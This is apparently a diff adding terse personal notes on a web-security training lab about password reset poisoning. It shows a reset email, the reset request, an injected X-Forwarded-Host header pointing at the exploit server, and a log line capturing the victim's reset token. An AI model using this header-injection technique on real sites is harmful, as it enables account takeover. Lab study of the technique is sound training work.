@@ -1,0 +1,33 @@
+Lab: Password reset poisoning via middleware
+
+This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server. 
+
+Your username is: wiener
+
+Your email is: wiener@exploit-0a2b003d04114f4a80eb0204014c00a6.exploit-server.net
+
+Sent	To	From	Subject	Body	
+2025-09-07 10:40:13 +0000	wiener@exploit-0a2b003d04114f4a80eb0204014c00a6.exploit-server.net	no-reply@0a7400ea047e4f2280d7038100c40014.web-security-academy.net	Account recovery	
+
+Hello!
+
+Please follow the link below to reset your password.
+
+https://0a7400ea047e4f2280d7038100c40014.web-security-academy.net/forgot-password?temp-forgot-password-token=opj8mwksb68w2vbo82795uzmf7a3bsna
+
+Thanks,
+Support team
+
+
+GET /forgot-password?temp-forgot-password-token=opj8mwksb68w2vbo82795uzmf7a3bsna HTTP/2
+
+temp-forgot-password-token=opj8mwksb68w2vbo82795uzmf7a3bsna&new-password-1=peter&new-password-2=peter
+
+https://exploit-0a2b003d04114f4a80eb0204014c00a6.exploit-server.net/
+
+
+we add 
+
+X-Forwarded-Host: exploit-0a2b003d04114f4a80eb0204014c00a6.exploit-server.net
+
+10.0.4.79       2025-09-07 10:52:09 +0000 "GET /forgot-password?temp-forgot-password-token=dkuhw3enezlehstouedytbpo48xatycf HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
